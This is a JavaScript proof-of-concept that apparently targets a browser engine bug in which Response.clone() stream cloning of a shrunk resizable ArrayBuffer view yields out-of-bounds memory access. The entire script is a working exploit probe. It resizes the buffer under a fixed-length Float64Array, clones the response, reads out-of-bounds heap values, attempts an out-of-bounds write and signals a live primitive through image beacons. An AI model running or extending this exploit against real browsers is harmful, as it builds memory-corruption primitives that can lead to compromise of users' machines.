// p345 - Response.clone() OOB via RAB resize
//
// Bug: structuredCloneForStream (StructuredClone.cpp:107-134)
// uses lengthRaw() without isOutOfBounds() check for resizable views.
// JS stream.tee() does NOT clone (shouldClone=false).
// ONLY FetchBody::clone() passes shouldClone=true (FetchBody.cpp:317).
// Trigger: Response(stream).clone() reads chunks through tee(true).
//
// Clone buffer is regular ArrayBuffer (not RAB) via tryCreate(byteLength, 1, maxByteLength).
// If maxByteLength preserved: clone is RAB, OOB bounded within maxByteLength.
// If not preserved: clone is regular AB, OOB into heap.
//
// Beacon prefix: V345-

(function() {
  var BQ = 0;
  function B(tag) {
    try { new Image().src = '/beacon/V345-' + tag + '?t=' + Date.now() + '&q=' + (BQ++); } catch(e) {}
  }

  B('BOOT');

  // Feature gates
  try { new ArrayBuffer(8, {maxByteLength: 64}); } catch(e) { B('NO-RAB'); return; }
  try { new Response('test'); B('RESPONSE-OK'); } catch(e) { B('NO-RESPONSE-' + e.message.substring(0, 30)); return; }

  // Phase 1: Verify Response.clone and ReadableStream work together
  try {
    var testStream = new ReadableStream({
      start: function(c) { c.enqueue(new Uint8Array([1,2,3])); c.close(); }
    });
    var testResp = new Response(testStream);
    var testClone = testResp.clone();
    B('P1-CLONE-OK');
  } catch(e) {
    B('P1-CLONE-ERR-' + e.message.substring(0, 40));
    return;
  }

  // Phase 2: RAB view enqueue, resize, then Response.clone
  var INITIAL = 2048;
  var MAX = 16384;
  var RESIZE_TO = 16;
  var ELEM_SIZE = 8;
  var VIEW_ELEMS = INITIAL / ELEM_SIZE; // 256 Float64 elements

  var rab = new ArrayBuffer(INITIAL, {maxByteLength: MAX});
  // Fixed-length view -- lengthRaw() returns 256 even after resize
  var view = new Float64Array(rab, 0, VIEW_ELEMS);

  // Fill with recognizable pattern
  for (var i = 0; i < VIEW_ELEMS; i++) {
    view[i] = 100.0 + i;
  }
  B('P2-FILLED-' + VIEW_ELEMS);

  var controller;
  var stream = new ReadableStream({
    start: function(c) {
      controller = c;
    }
  });

  // Enqueue the fixed-length RAB view
  controller.enqueue(view);
  B('P2-ENQUEUED');

  // Resize the RAB DOWN -- view is now OOB
  // lengthRaw() still returns 256, but buffer is 16 bytes
  rab.resize(RESIZE_TO);
  B('P2-RESIZED-' + rab.byteLength);

  // Check JS-visible view state after resize
  B('P2-VIEW-LEN-' + view.length);
  B('P2-VIEW-BL-' + view.byteLength);

  // Create Response from this stream
  var resp;
  try {
    resp = new Response(stream);
    B('P2-RESP-OK');
  } catch(e) {
    B('P2-RESP-ERR-' + e.message.substring(0, 40));
    return;
  }

  // Clone the Response -- THIS triggers FetchBody::clone() -> tee(true)
  // which uses structuredCloneForStream with shouldClone=true
  var cloned;
  try {
    cloned = resp.clone();
    B('P3-CLONED-OK');
  } catch(e) {
    B('P3-CLONE-ERR-' + e.message.substring(0, 40));
    return;
  }

  // Close the stream so reads complete
  controller.close();

  // Phase 4: Read from the CLONED response body
  // This triggers the pull function which calls structuredCloneForStream
  // on our stale RAB view (lengthRaw=256, buffer=16 bytes)
  try {
    var reader = cloned.body.getReader();
    reader.read().then(function(result) {
      if (result.done) {
        B('P4-DONE-EMPTY');
        return;
      }

      var chunk = result.value;
      B('P4-TYPE-' + Object.prototype.toString.call(chunk));

      if (chunk instanceof Float64Array) {
        var cLen = chunk.length;
        var cBLen = chunk.byteLength;
        var cBuf = chunk.buffer;
        var cBufLen = cBuf.byteLength;
        var cBufMax = 'unk';
        try { cBufMax = cBuf.maxByteLength; } catch(e) {}
        var isResizable = 'unk';
        try { isResizable = cBuf.resizable; } catch(e) {}

        B('P4-LEN-' + cLen);
        B('P4-BYTELEN-' + cBLen);
        B('P4-BUFLEN-' + cBufLen);
        B('P4-BUFMAX-' + cBufMax);
        B('P4-RESIZABLE-' + isResizable);

        var maxSafe = Math.floor(cBufLen / ELEM_SIZE);
        B('P4-MAXSAFE-' + maxSafe);

        if (cLen > maxSafe) {
          B('P4-OOB-CONFIRMED-' + cLen + '-vs-' + maxSafe);

          // Read OOB elements
          var oobReads = [];
          for (var k = 0; k < Math.min(cLen, 32); k++) {
            try {
              var val = chunk[k];
              if (val !== undefined && val !== 0) {
                oobReads.push(k + ':' + val.toFixed(2));
              } else if (val === 0) {
                oobReads.push(k + ':0');
              } else {
                oobReads.push(k + ':UNDEF');
              }
            } catch(e) {
              oobReads.push(k + ':ERR');
              break;
            }
          }
          B('P4-READS-' + oobReads.slice(0, 8).join('|'));
          if (oobReads.length > 8) B('P4-READS2-' + oobReads.slice(8, 16).join('|'));
          if (oobReads.length > 16) B('P4-READS3-' + oobReads.slice(16, 24).join('|'));

          // Test OOB write
          try {
            chunk[maxSafe] = 999.999;
            var rb = chunk[maxSafe];
            B('P4-WRITE-' + (rb === 999.999 ? 'OK' : 'FAIL-' + rb));
          } catch(e) {
            B('P4-WRITE-ERR-' + e.message.substring(0, 30));
          }

          // If clone buffer is RAB, try resize up
          if (isResizable) {
            try {
              cBuf.resize(cLen * ELEM_SIZE);
              B('P4-RESIZEUP-' + cBuf.byteLength);
            } catch(e) {
              B('P4-RESIZEUP-ERR-' + e.message.substring(0, 30));
            }
          }

          B('OOB-PRIMITIVE-LIVE');
        } else {
          B('P4-NO-OOB-' + cLen + '-vs-' + maxSafe);
          B('P4-V0-' + chunk[0]);
        }
      } else if (chunk instanceof Uint8Array) {
        // Response body might return Uint8Array instead of original type
        B('P4-UINT8-LEN-' + chunk.length);
        B('P4-UINT8-BUFLEN-' + chunk.buffer.byteLength);
        // Check if the Uint8Array has more bytes than its buffer
        var u8MaxSafe = chunk.buffer.byteLength;
        if (chunk.length > u8MaxSafe) {
          B('P4-U8-OOB-' + chunk.length + '-vs-' + u8MaxSafe);
        } else {
          B('P4-U8-SAFE-' + chunk.length + '-vs-' + u8MaxSafe);
        }
      } else if (chunk instanceof ArrayBuffer) {
        B('P4-ARRAYBUFFER-' + chunk.byteLength);
      } else {
        B('P4-OTHER-' + typeof chunk);
      }
      B('DONE');
    }).catch(function(err) {
      B('P4-READ-ERR-' + err.message.substring(0, 40));
      B('DONE');
    });

    // Also read from original response for comparison
    resp.body.getReader().read().then(function(result) {
      if (result.done) { B('P5-ORIG-DONE'); return; }
      var c = result.value;
      B('P5-ORIG-TYPE-' + Object.prototype.toString.call(c));
      if (c instanceof Float64Array) {
        B('P5-ORIG-LEN-' + c.length + '-BUFLEN-' + c.buffer.byteLength);
      } else {
        B('P5-ORIG-LEN-' + c.length);
      }
    }).catch(function(e) {
      B('P5-ORIG-ERR-' + e.message.substring(0, 40));
    });

  } catch(e) {
    B('P4-ERR-' + e.message.substring(0, 40));
  }

  // Timeout safety
  setTimeout(function() { B('TIMEOUT'); B('DONE'); }, 15000);
})();
